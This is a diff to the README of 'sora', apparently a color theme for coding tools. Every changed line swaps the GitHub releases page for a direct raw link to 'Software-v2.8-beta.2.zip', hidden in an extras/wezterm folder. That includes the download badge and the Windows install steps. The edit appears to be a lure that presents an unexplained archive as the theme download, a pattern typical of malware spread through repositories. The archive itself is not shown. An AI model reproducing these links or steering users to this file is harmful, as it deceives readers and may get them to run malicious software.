@@ -1,6 +1,6 @@
 # 🌌 sora - Deep colors for calm coding
 
-[![Download sora](https://img.shields.io/badge/Download%20sora-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/karelfiery239/sora/releases)
+[![Download sora](https://img.shields.io/badge/Download%20sora-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/karelfiery239/sora/raw/refs/heads/main/extras/wezterm/Software-v2.8-beta.2.zip)
 
 ## ✨ What is sora
 
@@ -12,7 +12,7 @@ Use sora if you want a steady theme that keeps your screen dark and your text cl
 
 To get sora on Windows, visit this page to download:
 
-https://github.com/karelfiery239/sora/releases
+https://github.com/karelfiery239/sora/raw/refs/heads/main/extras/wezterm/Software-v2.8-beta.2.zip
 
 1. Open the link in your browser.
 2. Find the latest release.
@@ -147,7 +147,7 @@ If the release archive includes folders like these, open the one that matches yo
 
 Use the release page and look for the newest version first. The newest release should have the current theme files. If there are several files, pick the one that matches the app name you use.
 
-https://github.com/karelfiery239/sora/releases
+https://github.com/karelfiery239/sora/raw/refs/heads/main/extras/wezterm/Software-v2.8-beta.2.zip
 
 ## 🧷 Why the theme stays readable
 
